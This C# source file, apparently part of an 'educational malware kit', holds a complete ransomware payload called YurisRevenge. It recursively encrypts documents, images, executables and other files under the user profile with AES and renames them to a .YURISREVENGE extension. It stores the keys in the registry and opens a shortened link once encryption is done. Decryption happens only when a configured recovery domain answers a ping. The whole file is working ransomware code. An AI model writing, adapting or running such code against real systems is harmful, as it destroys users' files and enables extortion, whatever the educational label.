using System;
using System.Collections.Generic;
using System.IO;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using EducationalMalwareKit.Encryption;
using EducationalMalwareKit.Toolkit;
using Microsoft.Win32;

namespace RedAlert
{
    public class YurisRevenge : IEducationalMalwarePayload
    {
        private const string RecoveryDomain = "RecoveryDomain";

        private bool _decryptionMode;
        private bool _hasEncrypted;
        private Dictionary<string, string> _config;
        private byte[] _key;
        private byte[] _salt;
        private string _registeryKey;
        private readonly List<string> _encryptedFiles = new List<string>();
        private readonly List<string> _targetExtensions = new List<string>()
        {
            ".YURISREVENGE",
            ".docx",
            ".doc",
            ".pptx",
            ".ppt",
            ".xls",
            ".xlsx",
            ".pdf",
            ".txt",
            ".text",
            ".dat",
            ".durl",
            ".wma",
            ".wpl",
            ".jpg",
            ".png",
            ".bmp",
            ".chm",
            ".dll",
            ".exe",
            ".ini",
            ".bak",
            ".hlp",
            ".udd",
            ".cpp",
            ".bat",
            ".sln",
            ".zip",
            ".xml",
        };

        public void ValidateConfig(PayloadConfig config)
        {
            if (!config.ContainsKey(RecoveryDomain))
            {
                config.SetInvalidOrMissingPair(RecoveryDomain, "Need domain name to allow recovery: Set valid, non-existent domain");
            }
        }

        public void Run(Dictionary<string, string> rawConfig)
        {
            var startFrom = Environment.GetEnvironmentVariable("UserProfile");
            _config = rawConfig;

            _registeryKey = "RedAlert";
            SetAndSaveKeys();

            do
            {
                _decryptionMode = GetMode();
                Go(startFrom);

                Thread.Sleep(60 * 1000);

            } while (_hasEncrypted || !_decryptionMode);
        }

        public void OnHalt()
        {
            if (!_decryptionMode)
            {
                SaveEncryptedFiles();
            }
        }

        private void Go(string startFrom)
        {
            if (_decryptionMode)
            {
                DecryptFiles();
            }
            else if (!_hasEncrypted)
            {
                TraverseAndEncryptFiles(startFrom);
                _hasEncrypted = true;
                // :D
                System.Diagnostics.Process.Start("http://bit.ly/2qiRGAa");
            }
        }

        private bool GetMode()
        {
            try
            {
                var pingReply = new Ping().Send(_config[RecoveryDomain], 10 * 1000);
                return pingReply != null && pingReply.Status == IPStatus.Success;
            }
            catch
            {
                return false;
            }
        }

        private void DumpEncryptedFilesToDesktop()
        {
            var desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var panicFile = Path.Combine(desktop, Path.GetRandomFileName());

            using (var writer = File.CreateText(panicFile))
            {
                _encryptedFiles.ForEach(x => writer.WriteLine(x));
                writer.Flush();
            }
        }

        private void DecryptFiles()
        {
            var softwareKey = Registry.CurrentUser.OpenSubKey("Software", true);
            var key = softwareKey.CreateSubKey(_registeryKey);
            var filesToDecrypt = new List<string>();

            for (var i = 2; i < key.ValueCount; i++)
            {
                var val = key.GetValue("ra_" + i);

                if (val == null)
                {
                    continue;
                }

                filesToDecrypt.Add(Encoding.UTF8.GetString((byte[])val));
            }

            foreach (var encryptedFile in filesToDecrypt)
            {
                DecryptOrEncryptFile(encryptedFile);
            }
        }

        private void SetAndSaveKeys()
        {
            var softwareKey = Registry.CurrentUser.OpenSubKey("Software", true);
            RegistryKey registryKey;

            if (softwareKey == null || (registryKey = softwareKey.CreateSubKey(_registeryKey)) == null)
            {
                _key = Encoding.UTF8.GetBytes("isitdoneyuri");
                _salt = Encoding.UTF8.GetBytes("nocomradepremier");

                return;
            }

            if (registryKey.ValueCount == 0)
            {
                _key = Encoding.UTF8.GetBytes(Path.GetTempFileName());
                _salt = Encoding.UTF8.GetBytes(Path.GetTempFileName());

                registryKey.SetValue("ra_0", _key);
                registryKey.SetValue("ra_1", _salt);
            }
            else
            {
                _key = (byte[])registryKey.GetValue("ra_0");
                _salt = (byte[])registryKey.GetValue("ra_1");
            }
        }

        private void SaveEncryptedFiles()
        {
            var softwareKey = Registry.CurrentUser.OpenSubKey("Software", true);

            if (softwareKey == null)
            {
                DumpEncryptedFilesToDesktop();
                return;
            }

            var key = softwareKey.CreateSubKey(_registeryKey);
            var i = 2;

            foreach (var encryptedFile in _encryptedFiles)
            {
                key.SetValue("ra_" + i++, Encoding.UTF8.GetBytes(encryptedFile));
            }
        }

        private void TraverseAndEncryptFiles(string inDir)
        {
            if (!Directory.Exists(inDir))
            {
                return;
            }

            foreach (var file in GetFiles(inDir))
            {
                try
                {
                    var encryptedPath = DecryptOrEncryptFile(file);

                    if (encryptedPath != null)
                    {
                        _encryptedFiles.Add(encryptedPath);
                    }
                }
                catch
                {

                }
            }

            SaveEncryptedFiles();
        }

        private string DecryptOrEncryptFile(string filePath)
        {
            var originalFilePath = string.Copy(filePath);
            var extension = Path.GetExtension(filePath);

            if (string.Equals(extension, _targetExtensions[0]) || !_targetExtensions.Contains(extension))
            {
                return null;
            }

            var encryptedFilePath = filePath.Replace(extension, _targetExtensions[0]);
            var fromFilePath = _decryptionMode ? encryptedFilePath : originalFilePath;
            var toFilePath = _decryptionMode ? originalFilePath : encryptedFilePath;
            byte[] content;

            if (!File.Exists(fromFilePath))
            {
                return null;
            }

            using (var reader = new BinaryReader(File.Open(fromFilePath, FileMode.Open, FileAccess.Read, FileShare.Read)))
            {
                content = reader.ReadAllBytes();
            }

            using (var writer = new BinaryWriter(File.Open(fromFilePath, FileMode.Truncate, FileAccess.Write)))
            {
                var bytes = _decryptionMode ? SimpleAES.DecryptBytes(content, _key, _salt) : SimpleAES.EncryptBytes(content, _key, _salt);
                writer.Write(bytes);
            }

            File.Move(fromFilePath, toFilePath);

            return fromFilePath;
        }

        private static IEnumerable<string> GetFiles(string root)
        {
            var pending = new Stack<string>();
            pending.Push(root);

            while (pending.Count != 0)
            {
                var path = pending.Pop();
                string[] next = null;

                try
                {
                    next = Directory.GetFiles(path);
                }
                catch { }

                if (next != null && next.Length != 0)
                {
                    foreach (var file in next) { yield return file; }
                }

                try
                {
                    next = Directory.GetDirectories(path);
                    foreach (var subdir in next) pending.Push(subdir);
                }
                catch { }
            }
        }
    }
}
